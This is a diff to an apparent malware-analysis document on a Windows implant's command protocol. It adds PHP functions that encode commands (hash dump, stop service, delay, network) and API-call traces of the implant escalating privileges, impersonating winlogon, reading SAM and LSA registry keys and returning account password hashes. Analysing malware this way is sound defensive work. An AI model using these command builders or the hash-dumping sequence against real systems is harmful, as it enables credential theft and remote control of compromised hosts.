@@ -1440,7 +1440,7 @@ function connect_localhost_global_struct($index)
 <a id="WriteMemory"></a>
 # WriteMemory  
 
-Writes given data to a specified address in memory, likely used for hooking or patching DLL  
+Writes given data to a specified address in memory, likely used for hooking or patching DLL as hinted by the 0x30 bytes VirtualQuery  
 
 ```php
 /*
@@ -1529,52 +1529,424 @@ function WriteMemory($address, $data)
 <a id="GetUsersPwdHashes"></a>
 # GetUsersPwdHashes  
 
-```php
+Retrieves user password hashes following the documented method as explained in this [blog post](https://moyix.blogspot.com/2008/02/syskey-and-sam.html)  
 
+```php
+function GetUsersPwdHashes()
+{
+	$cmd_id = "\x3b\xa2";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
 **I. Fetching the order**  
 
 ```html
-
+[CNT] [327]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000AE276B0140
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+W73cErJ4Hw/Yqg=="
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x000000AE276C1EA0
+[PAR] DWORD   *pcbBinary : 0x000000AE297BEB5C
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xae2971bea1]
 ```
 
 **II. Execution**   
 
 ```html
+[CNT] [338]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RtlAdjustPrivilege> in [ntdll.dll] 
+[PAR] ULONG    Privilege  : 0x14
+[PAR] BOOLEAN  Enable     : 0x1
+[PAR] BOOLEAN  Client     : 0x0
+[PAR] PBOOLEAN WasEnabled : 0x000000AE297BE67C
+[RET] [0xae29719a5c]
 
+[CNT] [339]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenProcessToken> in [ntdll.dll] 
+[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
+[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
+[PAR] PHANDLE     TokenHandle   : 0x000000AE297BE648
+[RET] [0xae29734b2f]
+
+[CNT] [340]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <LookupPrivilegeValueA> in [ADVAPI32.dll] 
+[PAR] LPCTSTR lpSystemName : 0x0 (null)
+[PAR] LPCTSTR lpName       : 0x000000AE297BE65B
+[STR]         -> "SeDebugPrivilege"
+[RET] [0xae2971a385]
+
+[CNT] [341]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <PrivilegeCheck> in [ADVAPI32.dll] 
+[PAR] HANDLE         ClientToken        : 0x2e0
+[PAR] PPRIVILEGE_SET RequiredPrivileges : 0x000000AE297BE66C
+[PAR] LPBOOL         pfResult           : 0x000000AE297BE644
+[RET] [0xae2971a3c9]
+
+[CNT] [342]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
+[PAR] DWORD dwFlags       : 0x2 ( TH32CS_SNAPPROCESS)
+[PAR] DWORD th32ProcessID : 0x0
+[RET] [0xae2971ed24]
+
+[CNT] [343]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <Process32FirstW> in [KERNEL32.DLL] 
+[PAR] HANDLE            hSnapshot : 0x2e0
+[PAR] LPPROCESSENTRY32W lppe      : 0x000000AE297BE428
+[RET] [0xae2971ed43]
+
+[CNT] [344]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <Process32NextW> in [KERNEL32.DLL] 
+[PAR] HANDLE            hSnapshot : 0x2e0
+[PAR] LPPROCESSENTRY32W lppe      : 0x000000AE297BE428
+[RET] [0xae2971ed53]
+
+[ * ] [pid 0xa84][tid 0x9bc] c:\windows\system32\rundll32.exe
+[API] <Process32NextW>
+[PAR] LPPROCESSENTRY32W lppe : 0x000000AE297BE428
+[FLD]                   -> th32ProcessID = 0x4
+[FLD]                   -> szExeFile     = "System"
+[RES] BOOL 0x1
+
+[...]
+
+[ * ] [pid 0xa84][tid 0x9bc] c:\windows\system32\rundll32.exe
+[API] <Process32NextW>
+[PAR] LPPROCESSENTRY32W lppe : 0x000000AE297BE428
+[FLD]                   -> th32ProcessID = 0x1c8
+[FLD]                   -> szExeFile     = "winlogon.exe"
+[RES] BOOL 0x1
+
+[CNT] [356]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenProcess> in [ntdll.dll] 
+[PAR] PHANDLE             ProcessHandle    : 0x000000AE297BE6F0
+[PAR] ACCESS_MASK         DesiredAccess    : 0x400 (PROCESS_QUERY_INFORMATION)
+[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x000000AE297BE730
+[PAR] PCLIENT_ID          ClientId         : 0x000000AE297BE708
+[FLD]                    -> UniqueProcess = 0x1c8
+[FLD]                    -> UniqueThread  = 0x0
+[RET] [0xae29734aab]
+
+[CNT] [365]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[/!\] [ Attempt to bypass hooked API detected ! ]
+[API] <NtOpenProcessToken> in [ntdll.dll] 
+[PAR] HANDLE      ProcessHandle : 0x2e0
+[PAR] ACCESS_MASK DesiredAccess : 0xa (TOKEN_DUPLICATE | TOKEN_QUERY)
+[PAR] PHANDLE     TokenHandle   : 0x000000AE297CB210
+[RET] [0xae29734b2f]
+
+[CNT] [366]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <ImpersonateLoggedOnUser> in [ADVAPI32.dll] 
+[PAR] HANDLE  hToken : 0x2d0
+[RET] [0xae297203c8]
+
+[CNT] [369]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCWSTR lpSubKey  : 0x000000AE276B0CF0
+[STR]         -> "SYSTEM"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2972c23e]
+
+[CNT] [376]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e0 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE29738604
+[STR]         -> "Select"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970d1bf]
+
+[CNT] [377]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryValueExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x2e8 
+[PAR] LPCWSTR lpValueName : 0x000000AE297385E4
+[STR]         -> "Current"
+[PAR] LPBYTE  lpData      : 0x000000AE297BE87C
+[PAR] LPDWORD lpcbData    : 0x000000AE297BE878
+[RET] [0xae2970d204]
+
+[CNT] [380]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e0 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE276C2290
+[STR]         -> "ControlSet001"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970d262]
+
+[CNT] [381]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryValueExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x2e8 
+[PAR] LPCWSTR lpValueName : 0x000000AE297385F4
+[STR]         -> "Default"
+[PAR] LPBYTE  lpData      : 0x000000AE297BE87C
+[PAR] LPDWORD lpcbData    : 0x000000AE297BE878
+[RET] [0xae2970d204]
+
+[CNT] [384]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e0 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE276C2110
+[STR]         -> "ControlSet001"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970d262]
+
+[CNT] [385]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[PAR] HKEY hKey : 0x2e8
+[RET] [0xae2970d292]
+
+[CNT] [386]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2f0 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE276B0DB0
+[STR]         -> "Control\LSA"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970e19c]
+
+[CNT] [387]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e8 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE29738638
+[STR]         -> "JD"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970e1d1]
+
+[CNT] [388]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryInfoKeyW> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey                   : 0x2f4 
+[PAR] LPWSTR    lpClass                : 0x000000AE297BE99E
+[PAR] LPDWORD   lpcchClass             : 0x000000AE297BE954
+[PAR] LPDWORD   lpReserved             : 0x0
+[PAR] LPDWORD   lpcSubKeys             : 0x0
+[PAR] LPDWORD   lpcbMaxSubKeyLen       : 0x0
+[PAR] LPDWORD   lpcbMaxClassLen        : 0x0
+[PAR] LPDWORD   lpcValues              : 0x0
+[PAR] LPDWORD   lpcbMaxValueNameLen    : 0x0
+[PAR] LPDWORD   lpcbMaxValueLen        : 0x0
+[PAR] LPDWORD   lpcbSecurityDescriptor : 0x0
+[PAR] PFILETIME lpftLastWriteTime      : 0x0
+[RET] [0xae2970e248]
+
+[CNT] [391]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e8 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE2973863E
+[STR]         -> "Skew1"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970e1d1]
+
+[CNT] [392]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryInfoKeyW> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey                   : 0x2f4 
+[PAR] LPWSTR    lpClass                : 0x000000AE297BE99E
+[PAR] LPDWORD   lpcchClass             : 0x000000AE297BE954
+[PAR] LPDWORD   lpReserved             : 0x0
+[PAR] LPDWORD   lpcSubKeys             : 0x0
+[PAR] LPDWORD   lpcbMaxSubKeyLen       : 0x0
+[PAR] LPDWORD   lpcbMaxClassLen        : 0x0
+[PAR] LPDWORD   lpcValues              : 0x0
+[PAR] LPDWORD   lpcbMaxValueNameLen    : 0x0
+[PAR] LPDWORD   lpcbMaxValueLen        : 0x0
+[PAR] LPDWORD   lpcbSecurityDescriptor : 0x0
+[PAR] PFILETIME lpftLastWriteTime      : 0x0
+[RET] [0xae2970e248]
+
+[CNT] [395]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e8 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE2973864A
+[STR]         -> "GBG"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970e1d1]
+
+[CNT] [396]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryInfoKeyW> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey                   : 0x2f4 
+[PAR] LPWSTR    lpClass                : 0x000000AE297BE99E
+[PAR] LPDWORD   lpcchClass             : 0x000000AE297BE954
+[PAR] LPDWORD   lpReserved             : 0x0
+[PAR] LPDWORD   lpcSubKeys             : 0x0
+[PAR] LPDWORD   lpcbMaxSubKeyLen       : 0x0
+[PAR] LPDWORD   lpcbMaxClassLen        : 0x0
+[PAR] LPDWORD   lpcValues              : 0x0
+[PAR] LPDWORD   lpcbMaxValueNameLen    : 0x0
+[PAR] LPDWORD   lpcbMaxValueLen        : 0x0
+[PAR] LPDWORD   lpcbSecurityDescriptor : 0x0
+[PAR] PFILETIME lpftLastWriteTime      : 0x0
+[RET] [0xae2970e248]
+
+[CNT] [399]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e8 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE29738652
+[STR]         -> "Data"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970e1d1]
+
+[CNT] [400]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryInfoKeyW> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey                   : 0x2f4 
+[PAR] LPWSTR    lpClass                : 0x000000AE297BE99E
+[PAR] LPDWORD   lpcchClass             : 0x000000AE297BE954
+[PAR] LPDWORD   lpReserved             : 0x0
+[PAR] LPDWORD   lpcSubKeys             : 0x0
+[PAR] LPDWORD   lpcbMaxSubKeyLen       : 0x0
+[PAR] LPDWORD   lpcbMaxClassLen        : 0x0
+[PAR] LPDWORD   lpcValues              : 0x0
+[PAR] LPDWORD   lpcbMaxValueNameLen    : 0x0
+[PAR] LPDWORD   lpcbMaxValueLen        : 0x0
+[PAR] LPDWORD   lpcbSecurityDescriptor : 0x0
+[PAR] PFILETIME lpftLastWriteTime      : 0x0
+[RET] [0xae2970e248]
+
+[CNT] [441]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCWSTR lpSubKey  : 0x000000AE2768C040
+[STR]         -> "SAM"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2972c28e]
+
+[CNT] [442]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2f0 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE276C2320
+[STR]         -> "SAM\Domains\Account"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970e8be]
+
+[CNT] [449]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryValueExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x2f4 
+[PAR] LPCWSTR lpValueName : 0x000000AE297386EE
+[STR]         -> "F"
+[PAR] LPBYTE  lpData      : 0x000000AE276BEE70
+[PAR] LPDWORD lpcbData    : 0x000000AE297BE4BC
+[RET] [0xae29717a18]
+
+[...]
+
+[CNT] [490]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2e8 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE276B0BF0
+[STR]         -> "Users"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970e931]
+
+[CNT] [491]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryInfoKeyW> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey                   : 0x2f4 
+[PAR] LPWSTR    lpClass                : 0x0
+[PAR] LPDWORD   lpcchClass             : 0x0
+[PAR] LPDWORD   lpReserved             : 0x0
+[PAR] LPDWORD   lpcSubKeys             : 0x000000AE297BE768
+[PAR] LPDWORD   lpcbMaxSubKeyLen       : 0x000000AE297BE76C
+[PAR] LPDWORD   lpcbMaxClassLen        : 0x0
+[PAR] LPDWORD   lpcValues              : 0x0
+[PAR] LPDWORD   lpcbMaxValueNameLen    : 0x0
+[PAR] LPDWORD   lpcbMaxValueLen        : 0x0
+[PAR] LPDWORD   lpcbSecurityDescriptor : 0x0
+[PAR] PFILETIME lpftLastWriteTime      : 0x0
+[RET] [0xae2970e99b]
+
+[CNT] [492]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegEnumKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey              : 0x2f4 
+[PAR] DWORD     dwIndex           : 0x0
+[PAR] LPWSTR    lpName            : 0x000000AE276B0850
+[PAR] LPDWORD   lpcchName         : 0x000000AE297BE770
+[FLD]           -> cchName = 0x9
+[PAR] LPDWORD   lpReserved        : 0x0
+[PAR] LPWSTR    lpClass           : 0x0
+[PAR] LPDWORD   lpcchClass        : 0x0
+[PAR] PFILETIME lpftLastWriteTime : 0x0
+[RET] [0xae2970ea23]
+
+[CNT] [495]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2f4 
+[PAR] LPCWSTR lpSubKey  : 0x000000AE276B0850
+[STR]         -> "000001F4"
+[PAR] DWORD   ulOptions : 0x0
+[RET] [0xae2970ea9a]
+
+[CNT] [496]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <RegQueryValueExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x2f8 
+[PAR] LPCWSTR lpValueName : 0x000000AE2973875E
+[STR]         -> "V"
+[PAR] LPBYTE  lpData      : 0x0
+[PAR] LPDWORD lpcbData    : 0x000000AE297BE6AC
+[RET] [0xae297179da]
 ```
 
 **III. Result**   
 
 ```html
-
+CNT] [625]
+[PTP] [0xa84] [0x9bc] [c:\windows\system32\rundll32.exe]
+[API] <CryptBinaryToStringW> in [crypt32.dll] 
+[PAR] BYTE*  pbBinary   : 0x000000AE276BF200
+[STR]        -> "3BA2"
+[STR]           "AA 20044266A8215CD84A3E9BE5FD344792"
+[STR]           "AB E06ED9E612C1052E5CB6BD3039DE0911"
+[STR]           "Administrateur 12 87D2CC8AAF6E545E03B47033D20BC3B7"
+[STR]           "user 12 ECDC95224F55C488F2A6C2FEECD6CF63"
+[PAR] DWORD  cbBinary   : 0x152
+[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
+[PAR] LPWSTR pszString  : 0x000000AE276ACC80
+[PAR] DWORD* pcchString : 0x000000AE297BE99C
+[RET] [0xae2971e028]
 ```
 
 <a id="CreateProcessConf3"></a>
 # CreateProcessConf3  
 
-```php
-
-```
-
-**I. Fetching the order**  
-
-```html
-
-```
-
-**II. Execution**   
-
-```html
-
-```
-
-**III. Result**   
-
-```html
-
-```
+TODO  
 
 <a id="unknown_update_global_struct"></a>
 # unknown_update_global_struct  
@@ -1587,73 +1959,112 @@ TODO
 # StopService  
 
 ```php
+// StopService("localhost", "evil");
+function StopService($MachineName, $ServiceName)
+{
 
+	$cmd_id = "\xb3\xd2 $MachineName $ServiceName";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
 **I. Fetching the order**  
 
 ```html
-
+[CNT] [395]
+[PTP] [0x684] [0xa6c] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000CDAADB41D0
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Z7LcSPwfZxLiwC6kHD5hsnoJYG0KtuqZac7/JBB0"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x000000CDAADBDD70
+[PAR] DWORD   *pcbBinary : 0x000000CDACC7E78C
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xcdacbdbea1]
 ```
 
 **II. Execution**   
 
 ```html
+[CNT] [405]
+[PTP] [0x684] [0xa6c] [c:\windows\system32\rundll32.exe]
+[API] <OpenSCManagerA> in [ADVAPI32.dll] 
+[PAR] LPCSTR  lpMachineName   : 0x0 (null)
+[PAR] LPCSTR  lpDatabaseName  : 0x000000CDACBF88F4
+[STR]         -> "ServicesActive"
+[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
+[RET] [0xcdacbedee3]
 
+[CNT] [406]
+[PTP] [0x684] [0xa6c] [c:\windows\system32\rundll32.exe]
+[API] <OpenServiceW> in [ADVAPI32.dll] 
+[PAR] SC_HANDLE hSCManager      : 0xaadc8070 
+[PAR] LPCWSTR   lpServiceName   : 0x000000CDAADC2470
+[STR]           -> "evil"
+[PAR] DWORD     dwDesiredAccess : 0x20 (SERVICE_STOP)
+[RET] [0xcdacbedf10]
+
+[CNT] [407]
+[PTP] [0x684] [0xa6c] [c:\windows\system32\rundll32.exe]
+[API] <ControlService> in [ADVAPI32.dll] 
+[PAR] SC_HANDLE hService   : 0xaadc85e0
+[PAR] DWORD     dwControl  : 0x1 (SERVICE_CONTROL_STOP)
+[RET] [0xcdacbedf36]
 ```
 
 **III. Result**   
 
-```html
+Error, specified service wasn't running  
 
+```html
+[CNT] [417]
+[PTP] [0x684] [0xa6c] [c:\windows\system32\rundll32.exe]
+[API] <CryptBinaryToStringW> in [crypt32.dll] 
+[PAR] BYTE*  pbBinary   : 0x000000CDAADC2170
+[STR]        -> "9999"
+[STR]           "1062"
+[PAR] DWORD  cbBinary   : 0x12
+[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
+[PAR] LPWSTR pszString  : 0x000000CDAADBDD70
+[PAR] DWORD* pcchString : 0x000000CDACC7E54C
+[RET] [0xcdacbde028]
 ```
 
 <a id="DelayCmdExec"></a>
 # DelayCmdExec  
 
+This command introduced a specified 'Sleep' before the execution of subsequent commands  
+
 ```php
+// ex: for 2sec : DelayCmdExec("2000");
+function DelayCmdExec($delay)
+{
 
+	$cmd_id = "\x9a\x6c $delay";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
-**I. Fetching the order**  
-
-```html
-
-```
-
-**II. Execution**   
-
-```html
-
-```
-
-**III. Result**   
-
-```html
-
-```
 
 <a id="unknown_network"></a>
 # unknown_network  
 
 ```php
+// ex: unknown_network("127.0.0.1", "80", "abcd", "42)
+function unknown_network($ip, $port, $unknown, $unknown2)
+{
 
+	$cmd_id = "\xd1\xf3 $ip $port $unknown $unknown2";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
-**I. Fetching the order**  
-
-```html
-
-```
-
-**II. Execution**   
-
-```html
-
-```
-
-**III. Result**   
-
-```html
-
-```
+TODO  
